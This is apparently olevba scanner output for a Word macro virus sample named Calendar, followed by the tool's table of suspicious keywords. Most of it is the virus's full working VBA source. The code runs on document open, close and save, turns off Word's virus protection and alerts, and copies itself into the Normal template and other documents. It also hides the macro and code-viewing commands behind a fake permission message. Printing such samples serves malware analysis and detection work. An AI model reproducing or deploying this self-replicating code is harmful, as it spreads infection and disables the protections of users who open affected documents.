olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Calendar-2cc7ad725e7d196f4c8c57be1d9dd231f777089f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Calendar-2cc7ad725e7d196f4c8c57be1d9dd231f777089f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Calendar.bas 
in file: Virus.MSWord.Calendar-2cc7ad725e7d196f4c8c57be1d9dd231f777089f - OLE stream: 'Macros/VBA/Calendar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Calendar

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = 0
    GlobalInstalled = 0

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Calendar" Then
            GlobalInstalled = 1
        End If
   Next
    
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Calendar" Then
            DocumentInstalled = 1
        End If
   Next
  
    If GlobalInstalled = 0 Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Calendar", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    If DocumentInstalled = 0 Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Calendar", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    Calendar
    
    Application.DisplayAlerts = wdAlertsAll

Calendar:
End Sub

Sub AutoClose()
On Error GoTo Calendar

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set GlobalDoc = NormalTemplate
    Set ActiveDoc = ActiveDocument

    GlobalInstalled = 0
    DocumentInstalled = 0

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Calendar" Then
            DocumentInstalled = 1
        End If
    Next
    
    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Calendar" Then
            GlobalInstalled = 1
        End If
    Next

    If GlobalInstalled = 0 Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Calendar", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    If DocumentInstalled = 0 Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Calendar", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    Calendar

    Application.DisplayAlerts = wdAlertsAll

Calendar:
End Sub

Sub ToolsMacro()
  Calendar
    MsgBox "You do not have permission to do this", vbExclamation, "Microsoft Word"
End Sub

Sub FileSaveAs()

    Dialogs(wdDialogFileSaveAs).Show

On Error GoTo Calendar

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set GlobalDoc = NormalTemplate
    Set ActiveDoc = ActiveDocument

    DocumentInstalled = 0
    GlobalInstalled = 0

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Calendar" Then
            GlobalInstalled = 1
        End If
    Next
    
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Calendar" Then
            DocumentInstalled = 1
        End If
    Next

    If DocumentInstalled = 0 Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Calendar", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If
    
    If GlobalInstalled = 0 Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Calendar", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    Calendar

    Application.DisplayAlerts = wdAlertsAll

Calendar:
End Sub

Sub FileTemplates()
  Calendar
  MsgBox "You do not have permission to do this", vbExclamation, "Microsoft Word"
End Sub


Sub Calendar()
On Error GoTo Calendar1

    If Month(Now()) = 1 And Day(Now()) = 1 Then
      MsgBox "New Year's Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 1 And Day(Now()) = 20 Then
      MsgBox "Martin Luther King Jr. Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 2 And Day(Now()) = 12 Then
      MsgBox "President Lincoln's Birthday and Ash Wednesday", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 2 And Day(Now()) = 14 Then
      MsgBox "Valentine's Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 2 And Day(Now()) = 17 Then
      MsgBox "Presidents Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 2 And Day(Now()) = 22 Then
      MsgBox "President Washington's Birthday", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 3 And Day(Now()) = 17 Then
      MsgBox "St. Patrick's Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 3 And Day(Now()) = 23 Then
      MsgBox "Palm Sunday", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 3 And Day(Now()) = 28 Then
      MsgBox "Good Friday", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 3 And Day(Now()) = 30 Then
      MsgBox "Easter", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 4 And Day(Now()) = 22 Then
      MsgBox "Passover", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 5 And Day(Now()) = 9 Then
      MsgBox "Calendar, coded by DarkChasm [SLAM]", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 5 And Day(Now()) = 11 Then
      MsgBox "Mother's Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 5 And Day(Now()) = 17 Then
      MsgBox "Armed Forces Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 5 And Day(Now()) = 19 Then
      MsgBox "Victoria Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 5 And Day(Now()) = 26 Then
      MsgBox "Memorial Day Observed", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 5 And Day(Now()) = 30 Then
      MsgBox "Traditional Memorial Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 6 And Day(Now()) = 15 Then
      MsgBox "Father's Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 7 And Day(Now()) = 1 Then
      MsgBox "Canada Day", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 7 And Day(Now()) = 4 Then
      MsgBox "Independence Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 10 And Day(Now()) = 2 Then
      MsgBox "Rosh Hashonah", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 10 And Day(Now()) = 11 Then
      MsgBox "Yom Kippur", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 10 And Day(Now()) = 12 Then
      MsgBox "Columbus Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 10 And Day(Now()) = 13 Then
      MsgBox "Columbus Day Observed", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 10 And Day(Now()) = 16 Then
      MsgBox "Happy Birthday DarkChasm", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 10 And Day(Now()) = 24 Then
      MsgBox "United Nations Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 10 And Day(Now()) = 31 Then
      MsgBox "Halloween", vbOKOnly, "Calendar"
    End If
    
    If Month(Now()) = 11 And Day(Now()) = 4 Then
      MsgBox "Election Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 11 And Day(Now()) = 11 Then
      MsgBox "Veteran's Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 11 And Day(Now()) = 27 Then
      MsgBox "ThanksGiving Day", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 12 And Day(Now()) = 21 Then
      MsgBox "Happy Birthday Christy", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 12 And Day(Now()) = 24 Then
      MsgBox "Christmas Eve and Hanukkah", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 12 And Day(Now()) = 25 Then
      MsgBox "Christmas", vbOKOnly, "Calendar"
    End If

    If Month(Now()) = 12 And Day(Now()) = 31 Then
      MsgBox "New Year's Eve", vbOKOnly, "Calendar"
    End If

Calendar1:
End Sub

Sub ViewVBCode()
  Calendar
  MsgBox "You do not have permission to do this", vbExclamation, "Microsoft Word"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

